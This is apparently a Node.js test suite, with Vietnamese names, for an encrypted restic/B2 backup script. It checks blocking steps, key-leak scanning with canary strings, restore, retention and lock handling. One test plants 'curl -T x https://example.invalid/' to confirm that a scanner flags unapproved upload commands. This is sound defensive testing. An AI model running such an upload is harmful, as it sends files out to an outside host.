// node --test --test-concurrency=1 scripts/sao-luu-ngoai-may.test.mjs
// Hồ sơ sao-luu-ma-hoa-b2 — ca C1–C16 của design doc §10. Mọi ca chạy trên thư mục tạm:
//   - cây nguồn giả (collector/snapshots, collector/state) và kho restic CỤC BỘ dưới thư mục tạm, không kho từ xa nào;
//   - lệnh `security` giả (SAO_LUU_SECURITY) giữ mật khẩu trong một thư mục tạm — không đụng Keychain thật;
//   - restic giả ghi lại mọi lời gọi cho ca bước chặn; restic thật cho ca sao lưu, mã hoá, giữ, khôi phục.
// Khoá và mật khẩu là chuỗi canh *-CANARY-*: ca nào cũng soát chúng vắng khỏi đầu ra.
import assert from "node:assert/strict";
import { spawnSync, spawn } from "node:child_process";
import { randomBytes } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { after, before, describe, test } from "node:test";

import {
  LUAT_LOAI_TRU_STATE, chay, demTepHang, docCauHinh, khoiTao, kiem, kiemTruoc, lsMoiNhat, soatKhoa,
} from "./lib/sao-luu-ngoai-may.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const GOC_KHO = path.resolve(HERE, "..");
const LIB = path.join(HERE, "lib", "sao-luu-ngoai-may.mjs");
const SH = path.join(HERE, "sao-luu-ngoai-may.sh");
const B2ID = `B2ID-CANARY-${randomBytes(6).toString("hex")}`;
const B2KEY = `B2KEY-CANARY-${randomBytes(6).toString("hex")}`;
const PLAIN = `PLAINTEXT-CANARY-${randomBytes(8).toString("hex")}`;
const canTra = [];
after(() => { for (const d of canTra) fs.rmSync(d, { recursive: true, force: true }); });

// Tệp state gài sẵn khớp luật — viết tay, KHÔNG suy từ regex (ma trận viết trước của C7).
const STATE_LOAI = ["zalo-session.json", "cookies.txt", "browser-profile/x.json", "login-qr.png", "api-token.json", "id.key"];
const STATE_GIU = ["ok-1.json", "ok-2.sqlite"];
// Raw snapshot mang từ của luật — phải được giữ trọn (C15).
const SNAP_TEN_KHOP = ["chat_profile.json", "author.json", "qrcode_listing.json", "session_log.jsonl", "token_count.json"];

function viet(p, noiDung, mode) {
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, noiDung);
  if (mode) fs.chmodSync(p, mode);
}

/** Dựng một môi trường thử. resticThat=false → restic giả ghi lời gọi vào goi.log. */
function dung({ resticThat = false, xacNhan = true, coMuc = false, dumpLoi = false } = {}) {
  const g = fs.mkdtempSync(path.join(os.tmpdir(), "sl-test-"));
  canTra.push(g);
  const home = path.join(g, "home");
  const cauHinh = path.join(home, ".oneinvest", "b2.env");
  viet(cauHinh, `RESTIC_REPOSITORY=${path.join(g, "kho")}\nB2_ACCOUNT_ID=${B2ID}\nB2_ACCOUNT_KEY=${B2KEY}\n`, 0o600);
  const thuMuc = path.join(home, ".oneinvest", "sao-luu");
  fs.mkdirSync(thuMuc, { recursive: true });
  if (xacNhan) viet(path.join(thuMuc, "da-cat-khoa"), "đã cất\n");
  const kc = path.join(g, "kc");
  fs.mkdirSync(kc);
  const security = path.join(g, "bin", "security");
  viet(security, `#!/bin/bash
D=${JSON.stringify(kc)}
cmd=$1; shift; s=""; w=0; pw=""
while [ $# -gt 0 ]; do case $1 in -s) s=$2; shift 2;; -a) shift 2;; -w) if [ $# -ge 2 ]; then pw=$2; shift 2; else w=1; shift; fi;; *) shift;; esac; done
case $cmd in
  find-generic-password) [ -f "$D/$s" ] || exit 44; [ $w = 1 ] && cat "$D/$s"; exit 0;;
  add-generic-password) [ -f "$D/$s" ] && exit 45; printf %s "$pw" > "$D/$s"; exit 0;;
esac
exit 2
`, 0o755);
  if (coMuc) viet(path.join(kc, "onehub-restic"), `RPW-CANARY-${randomBytes(8).toString("hex")}`);
  const goiLog = path.join(g, "goi.log");
  const resticGia = path.join(g, "bin", "restic-gia");
  viet(resticGia, `#!/bin/bash\necho "$*" >> ${JSON.stringify(goiLog)}\n[ "$1" = version ] && echo "restic 0.0 gia"\nexit 0\n`, 0o755);
  const dump = path.join(g, "bin", "dump-gia");
  viet(dump, dumpLoi ? "#!/bin/bash\nexit 1\n" : `#!/bin/bash
mkdir -p "$1"; printf 'dump-co-dinh-%s\\n' {1..400} > "$1/a.dump"; printf 'public.t\\t3\\n' > "$1/so-dong.tsv"
`, 0o755);
  const goc = path.join(g, "goc");
  for (let i = 0; i < 80; i++) viet(path.join(goc, "collector", "snapshots", `d${i % 4}`, `f${String(i).padStart(3, "0")}.json`), `{"i":${i},"r":"${randomBytes(32768).toString("hex")}"}\n`);
  for (const t of SNAP_TEN_KHOP) viet(path.join(goc, "collector", "snapshots", "s03", t), `{"x":"${t}"}\n`);
  viet(path.join(goc, "collector", "snapshots", "s03", "tệp có dấu cách.json"), `{"canh":"${PLAIN}"}\n`);
  viet(path.join(goc, "collector", "snapshots", ".cache", "c.bin"), "cache\n");
  for (const t of [...STATE_LOAI, ...STATE_GIU]) viet(path.join(goc, "collector", "state", t), `{"t":"${t}"}\n`);
  const env = {
    SAO_LUU_CAU_HINH: cauHinh, SAO_LUU_THU_MUC: thuMuc, SAO_LUU_SECURITY: security, SAO_LUU_GOC_NGUON: goc,
    SAO_LUU_LENH_DUMP: `bash ${dump}`, SAO_LUU_RESTIC: resticThat ? "restic" : resticGia, SAO_LUU_LOG: path.join(g, "log"),
  };
  const cfg = docCauHinh({ env, home });
  const goi = () => (fs.existsSync(goiLog) ? fs.readFileSync(goiLog, "utf8").split("\n").filter(Boolean) : []);
  return { g, home, cauHinh, thuMuc, kc, env, cfg, goi, goc, kho: path.join(g, "kho") };
}

function cli(f, ...args) {
  const r = spawnSync("bash", [SH, ...args], { env: { ...process.env, ...f.env, HOME: f.home }, encoding: "utf8" });
  return { code: r.status, ra: (r.stdout || "") + (r.stderr || "") };
}

function khongLoKhoa(chu, ca, f) {
  const mk = fs.existsSync(path.join(f.kc, "onehub-restic")) ? fs.readFileSync(path.join(f.kc, "onehub-restic"), "utf8") : null;
  for (const v of [B2ID, B2KEY, mk].filter(Boolean)) assert.ok(!chu.includes(v), `${ca}: đầu ra chứa giá trị khoá`);
}

function demTmpSaoLuu() {
  return fs.readdirSync(os.tmpdir()).filter((n) => n.startsWith("sao-luu-")).length;
}

function resticThu(f, args, mk) {
  const pw = mk ?? fs.readFileSync(path.join(f.kc, "onehub-restic"), "utf8");
  return spawnSync("restic", ["-r", f.kho, ...args], { env: { ...process.env, RESTIC_PASSWORD: pw }, encoding: "utf8", maxBuffer: 1 << 28 });
}

describe("bước chặn và cấu hình (AC-1, AC-2)", () => {
  test("C1 chay thiếu tệp xác nhận → mã 3, 0 lời gọi restic, không thư mục dump", () => {
    const f = dung({ xacNhan: false, coMuc: true });
    const truoc = demTmpSaoLuu();
    const r = chay(f.cfg);
    assert.equal(r.ma, 3, "C1: mã thoát");
    assert.deepEqual(f.goi(), [], "C1: restic giả có lời gọi");
    assert.equal(demTmpSaoLuu(), truoc, "C1: có thư mục dump mới");
    const c = cli(f, "chay");
    assert.equal(c.code, 3, "C1: CLI mã thoát");
    khongLoKhoa(c.ra, "C1", f);
  });

  test("C1+ cùng fixture có tệp xác nhận → restic được gọi backup", () => {
    const f = dung({ coMuc: true });
    chay(f.cfg);
    assert.ok(f.goi().some((l) => / backup /.test(` ${l} `)), "C1+: không có lời gọi backup");
  });

  test("C13 khoi-tao thiếu tệp xác nhận → mã 3, 0 lời gọi, không tạo mục Keychain", () => {
    const f = dung({ xacNhan: false });
    const r = khoiTao(f.cfg);
    assert.equal(r.ma, 3, "C13: mã thoát");
    assert.deepEqual(f.goi(), [], "C13: restic giả có lời gọi");
    assert.deepEqual(fs.readdirSync(f.kc), [], "C13: Keychain có mục mới");
  });

  test("C13+ có tệp xác nhận → tạo mục Keychain và gọi init", () => {
    const f = dung();
    const r = khoiTao(f.cfg);
    assert.equal(r.ma, 0, `C13+: ${r.lyDo}`);
    assert.ok(f.goi().some((l) => l.endsWith(" init")), "C13+: không có lời gọi init");
    assert.deepEqual(fs.readdirSync(f.kc), ["onehub-restic"], "C13+: thiếu mục Keychain");
    khongLoKhoa(r.lyDo, "C13+", f);
  });

  test("C2 tệp cấu hình quyền 644 → mã 4 nêu 600, 0 lời gọi", () => {
    const f = dung({ coMuc: true });
    fs.chmodSync(f.cauHinh, 0o644);
    const r = kiemTruoc(f.cfg);
    assert.equal(r.ma, 4, "C2: mã thoát");
    assert.match(r.lyDo, /600/, "C2: thông điệp");
    const c = cli(f, "chay");
    assert.equal(c.code, 4, "C2: CLI");
    assert.deepEqual(f.goi(), [], "C2: restic giả có lời gọi");
    khongLoKhoa(c.ra, "C2", f);
  });

  test("C3 tệp cấu hình nằm trong cây kho → mã 4 «ngoài kho»", () => {
    const f = dung({ coMuc: true });
    const trong = path.join(GOC_KHO, `.sl-test-${randomBytes(4).toString("hex")}.env`);
    try {
      fs.copyFileSync(f.cauHinh, trong);
      fs.chmodSync(trong, 0o600);
      const cfg = docCauHinh({ env: { ...f.env, SAO_LUU_CAU_HINH: trong }, home: f.home });
      const r = kiemTruoc(cfg);
      assert.equal(r.ma, 4, "C3: mã thoát");
      assert.match(r.lyDo, /ngoài kho/, "C3: thông điệp");
      assert.deepEqual(f.goi(), [], "C3: restic giả có lời gọi");
    } finally {
      fs.rmSync(trong, { force: true });
    }
  });

  test("C4 không chạy được restic → mã 5", () => {
    const f = dung({ coMuc: true });
    const cfg = docCauHinh({ env: { ...f.env, SAO_LUU_RESTIC: "/khong/co/restic" }, home: f.home });
    assert.equal(kiemTruoc(cfg).ma, 5, "C4: mã thoát");
  });

  test("C5 Keychain không có mục → mã 6, 0 lời gọi, không lộ giá trị", () => {
    const f = dung({ coMuc: false });
    const c = cli(f, "chay");
    assert.equal(c.code, 6, "C5: CLI mã thoát");
    assert.deepEqual(f.goi(), [], "C5: restic giả có lời gọi");
    khongLoKhoa(c.ra, "C5", f);
  });

  test("C6 dump lỗi → trạng thái loi/dump, không lời gọi backup", () => {
    const f = dung({ coMuc: true, dumpLoi: true });
    const r = chay(f.cfg);
    assert.equal(r.ma, 1, "C6: mã thoát");
    const tt = JSON.parse(fs.readFileSync(f.cfg.tepTrangThai, "utf8"));
    assert.equal(tt.ket_qua, "loi", "C6: ket_qua");
    assert.equal(tt.buoc_loi, "dump", "C6: buoc_loi");
    assert.ok(!f.goi().some((l) => l.includes("backup")), "C6: có lời gọi backup");
  });
});

describe("sao lưu thật trên kho cục bộ (AC-3, AC-4, AC-7, AC-8, AC-9, AC-5)", () => {
  let f, lan1, lan2;
  before(() => {
    f = dung({ resticThat: true });
    const k = khoiTao(f.cfg);
    assert.equal(k.ma, 0, `khoi-tao: ${k.lyDo}`);
    lan1 = chay(f.cfg);
    lan2 = chay(f.cfg);
  });

  function tapKyVong() {
    const out = new Set();
    const goc = path.join(f.goc, "collector");
    const boLoai = new Set([...STATE_LOAI.map((t) => path.join(goc, "state", t)), path.join(goc, "snapshots", ".cache", "c.bin")]);
    const duyet = (d) => { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, e.name); e.isDirectory() ? duyet(p) : out.add(p); } };
    duyet(goc);
    for (const p of boLoai) out.delete(p);
    return out;
  }

  test("C7 bản mới có đúng tập tệp kỳ vọng, số tệp và cỡ khớp, kho ảnh chua_co", () => {
    assert.equal(lan1.ma, 0, `C7: ${lan1.lyDo}`);
    const tt = JSON.parse(fs.readFileSync(f.cfg.tepTrangThai, "utf8")); // trạng thái của bản mới nhất (lượt 2)
    const ls = lsMoiNhat(f.cfg);
    const coNguon = new Set(ls.tep.filter((p) => !p.startsWith(tt.dump_duong)));
    const ky = tapKyVong();
    assert.deepEqual([...coNguon].sort(), [...ky].sort(), "C7: tập tệp trong bản khác kỳ vọng");
    const dump = ls.tep.filter((p) => p.startsWith(tt.dump_duong));
    assert.deepEqual(dump.map((p) => path.basename(p)).sort(), ["a.dump", "so-dong.tsv"], "C7: tệp dump");
    assert.equal(tt.so_tep, ky.size + 2, "C7: so_tep");
    assert.equal(tt.kho_anh, "chua_co", "C7: kho_anh");
    assert.ok(!fs.existsSync(path.dirname(tt.dump_duong)), "C7: thư mục dump tạm còn");
    for (const t of STATE_LOAI) assert.ok(LUAT_LOAI_TRU_STATE.test(path.basename(t)) || t.includes("profile"), `C7: tệp gài ${t} không khớp luật`);
  });

  test("C15 raw snapshot mang từ của luật vẫn có đủ; bản đột biến áp lên snapshots thì thiếu", () => {
    const thieu = (tep) => SNAP_TEN_KHOP.filter((t) => !tep.some((p) => p.endsWith(`/s03/${t}`)));
    assert.deepEqual(thieu(lsMoiNhat(f.cfg).tep), [], "C15: raw snapshot bị loại");
    const d = dung({ resticThat: true });
    khoiTao(d.cfg);
    const r = chay(d.cfg, { _dotBien: "ap-toan-cay" });
    assert.equal(r.ma, 0, "C15 đột biến: chạy");
    assert.ok(thieu(lsMoiNhat(d.cfg).tep).length > 0, "C15 đối chứng: bản đột biến không làm mất tệp nào — thước không đỏ được");
  });

  test("C8 chạy lại không đổi nguồn → byte mới dưới 1% lần đầu", () => {
    assert.equal(lan2.ma, 0, `C8: ${lan2.lyDo}`);
    assert.ok(lan2.trangThai.byte_moi < 0.01 * lan1.trangThai.byte_moi, `C8: byte_moi ${lan2.trangThai.byte_moi} / ${lan1.trangThai.byte_moi}`);
  });

  test("AC-4 kho không chứa chữ gốc; mật khẩu sai không khôi phục được", () => {
    const tep = [];
    const duyet = (d) => { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, e.name); e.isDirectory() ? duyet(p) : tep.push(p); } };
    duyet(f.kho);
    assert.ok(tep.some((p) => p.includes(`${path.sep}data${path.sep}`)), "AC-4: kho không có tệp data");
    const co = tep.filter((p) => fs.readFileSync(p).includes(Buffer.from(PLAIN)));
    assert.deepEqual(co, [], "AC-4: tệp trong kho chứa chuỗi canh");
    const nguon = fs.readFileSync(path.join(f.goc, "collector", "snapshots", "s03", "tệp có dấu cách.json"), "utf8");
    assert.ok(nguon.includes(PLAIN), "AC-4 đối chứng: chuỗi canh không có trong nguồn");
    const dich = fs.mkdtempSync(path.join(os.tmpdir(), "sl-sai-"));
    canTra.push(dich);
    const r = resticThu(f, ["restore", "latest", "--target", dich], "mat-khau-sai");
    assert.notEqual(r.status, 0, "AC-4: mật khẩu sai vẫn khôi phục được");
  });

  test("AC-7 tệp trạng thái đủ trường, không chứa khoá hay đường kho", () => {
    const chu = fs.readFileSync(f.cfg.tepTrangThai, "utf8");
    const tt = JSON.parse(chu);
    for (const k of ["ket_qua", "lan_ok_cuoi", "snapshot_id", "so_tep", "so_byte", "byte_moi", "dump_sha256"]) assert.ok(tt[k] != null, `AC-7: thiếu ${k}`);
    assert.equal(tt.ket_qua, "ok", "AC-7: ket_qua");
    khongLoKhoa(chu, "AC-7", f);
    assert.ok(!chu.includes(f.kho) && !chu.includes("RESTIC_REPOSITORY"), "AC-7: tệp trạng thái lộ đường kho");
  });

  test("E9 soat-khoa: sạch sau lượt chạy; tệp gài khoá → mã 1, chỉ in đường", () => {
    const log = path.join(f.g, "log");
    fs.mkdirSync(log, { recursive: true });
    viet(path.join(log, "sach.log"), "không có gì\n");
    assert.equal(soatKhoa(f.cfg, { duong: [f.thuMuc, log] }).ma, 0, "E9: cây sạch mà soát ra khoá");
    const gai = path.join(log, "gai.log");
    viet(gai, `lỡ in: ${B2KEY}\n`);
    const r = soatKhoa(f.cfg, { duong: [f.thuMuc, log] });
    assert.equal(r.ma, 1, "E9: tệp gài không bị bắt");
    assert.deepEqual(r.tep, [gai], "E9: đường tệp");
    const c = cli(f, "soat-khoa", f.thuMuc, log);
    assert.equal(c.code, 1, "E9: CLI mã");
    assert.ok(c.ra.includes(gai), "E9: CLI không in đường");
    khongLoKhoa(c.ra, "E9", f);
    fs.rmSync(gai);
  });

  test("C10 kiem trên kho lành: ≥50 tệp + bản dump, sha256 khớp", () => {
    const r = kiem(f.cfg, { hatGiong: 42, tyLeDoc: "100%" });
    assert.equal(r.ma, 0, `C10: ${r.thongDiep}`);
    assert.ok(r.soTep >= 52, `C10: chỉ khôi phục ${r.soTep} tệp`);
    assert.deepEqual(r.lech, [], "C10: lệch");
  });

  test("C14 sha256 mốc của tệp dump sai → mã 1 nêu tệp dump; thiếu mốc → mã 1", () => {
    const goc = fs.readFileSync(f.cfg.tepTrangThai, "utf8");
    try {
      const tt = JSON.parse(goc);
      tt.dump_sha256["a.dump"] = "0".repeat(64);
      fs.writeFileSync(f.cfg.tepTrangThai, JSON.stringify(tt));
      const r = kiem(f.cfg, { hatGiong: 1, tyLeDoc: "100%" });
      assert.equal(r.ma, 1, "C14: mã");
      assert.match(r.thongDiep, /a\.dump/, "C14: thông điệp");
      delete tt.dump_sha256;
      fs.writeFileSync(f.cfg.tepTrangThai, JSON.stringify(tt));
      const r2 = kiem(f.cfg, { hatGiong: 1, tyLeDoc: "100%" });
      assert.equal(r2.ma, 1, "C14b: mã");
      assert.match(r2.thongDiep, /không có mốc sha256/, "C14b: thông điệp");
    } finally {
      fs.writeFileSync(f.cfg.tepTrangThai, goc);
    }
  });

  test("C11 phá một tệp pack → kiem mã 1 nêu bước check", () => {
    const data = [];
    const duyet = (d) => { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, e.name); e.isDirectory() ? duyet(p) : data.push(p); } };
    duyet(path.join(f.kho, "data"));
    const lon = data.sort((a, b) => fs.statSync(b).size - fs.statSync(a).size)[0];
    fs.chmodSync(lon, 0o600);
    const fd = fs.openSync(lon, "r+");
    fs.writeSync(fd, randomBytes(16), 0, 16, Math.floor(fs.statSync(lon).size / 2));
    fs.closeSync(fd);
    const r = kiem(f.cfg, { hatGiong: 7, tyLeDoc: "100%" });
    assert.equal(r.ma, 1, "C11: mã");
    assert.match(r.thongDiep, /check/, "C11: thông điệp");
  });
});

describe("giữ phiên bản và khoá kho (AC-9)", () => {
  test("C9 14 bản theo ngày → còn đúng tập 7 ngày / 4 tuần / 6 tháng", () => {
    const f = dung({ resticThat: true });
    khoiTao(f.cfg);
    const NGAY = ["2026-01-10", "2026-02-10", "2026-03-10", "2026-04-10", "2026-05-10", "2026-06-10",
      "2026-07-01", "2026-07-02", "2026-07-03", "2026-07-04", "2026-07-05", "2026-07-06", "2026-07-07", "2026-07-08"];
    // Viết tay: daily 7 = 02…08/07; weekly 4 = 08/07, 05/07, 10/06, 10/05; monthly 6 = 07, 06, 05, 04, 03, 02 → bỏ 01/07 và 10/01.
    const NGAY_GIU = ["2026-02-10", "2026-03-10", "2026-04-10", "2026-05-10", "2026-06-10",
      "2026-07-02", "2026-07-03", "2026-07-04", "2026-07-05", "2026-07-06", "2026-07-07", "2026-07-08"];
    for (const d of NGAY) {
      const r = chay(f.cfg, { luc: new Date(`${d}T03:30:00`) });
      assert.equal(r.ma, 0, `C9 ${d}: ${r.lyDo}`);
    }
    const s = JSON.parse(resticThu(f, ["snapshots", "--json"]).stdout);
    const con = s.map((x) => {
      const t = new Date(x.time);
      return `${t.getFullYear()}-${String(t.getMonth() + 1).padStart(2, "0")}-${String(t.getDate()).padStart(2, "0")}`;
    }).sort();
    assert.deepEqual(con, NGAY_GIU, "C9: tập bản còn lại");
  });

  test("C16 kho đang bị một tiến trình khác giữ khoá → lượt ghi loi ở bước giữ, bản đã vào kho", async () => {
    const f = dung({ resticThat: true });
    khoiTao(f.cfg);
    const mk = fs.readFileSync(path.join(f.kc, "onehub-restic"), "utf8");
    const giu = spawn("restic", ["-r", f.kho, "backup", "--stdin", "--stdin-filename", "giu.txt"], { env: { ...process.env, RESTIC_PASSWORD: mk }, stdio: ["pipe", "ignore", "ignore"] });
    try {
      const locks = path.join(f.kho, "locks");
      for (let i = 0; i < 100 && !(fs.existsSync(locks) && fs.readdirSync(locks).length); i++) await new Promise((r) => setTimeout(r, 100));
      assert.ok(fs.readdirSync(locks).length > 0, "C16: tiến trình giữ không tạo được khoá");
      const r = chay(f.cfg);
      assert.equal(r.ma, 1, "C16: mã");
      assert.equal(r.trangThai.buoc_loi, "giu", "C16: buoc_loi");
      assert.ok(r.trangThai.snapshot_id, "C16: bản không vào kho");
    } finally {
      giu.stdin.end();
      giu.kill();
    }
  });
});

describe("quét lệnh của hàng (AC-4, AC-10)", () => {
  test("E4 tệp của hàng không gọi lệnh tải lên nào ngoài restic; tệp gài lệnh tải thì đếm ra", () => {
    for (const t of ["scripts/sao-luu-ngoai-may.sh", "scripts/lib/sao-luu-ngoai-may.mjs"]) {
      const dong = fs.readFileSync(path.join(GOC_KHO, t), "utf8").split("\n");
      const d = demTepHang(t, dong);
      assert.equal(d.lenh_tai_khac, 0, `E4: ${t} có lệnh tải khác`);
      assert.equal(d.nap_lich, 0, `E4: ${t} có lệnh launchd`);
      assert.equal(demTepHang(t, [...dong, "curl -T x https://example.invalid/"]).lenh_tai_khac, 1, `E4 đối chứng: ${t} gài lệnh tải mà không bắt`);
    }
    const tTest = "scripts/sao-luu-ngoai-may.test.mjs";
    assert.equal(demTepHang(tTest, fs.readFileSync(fileURLToPath(import.meta.url), "utf8").split("\n")).kho_tu_xa_trong_test, 0, "E11: test dùng kho từ xa");
    assert.equal(demTepHang(tTest, ["const kho = \"" + "b" + "2:thung:onehub\";"]).kho_tu_xa_trong_test, 1, "E11 đối chứng: kho từ xa gài không bị bắt");
  });
});
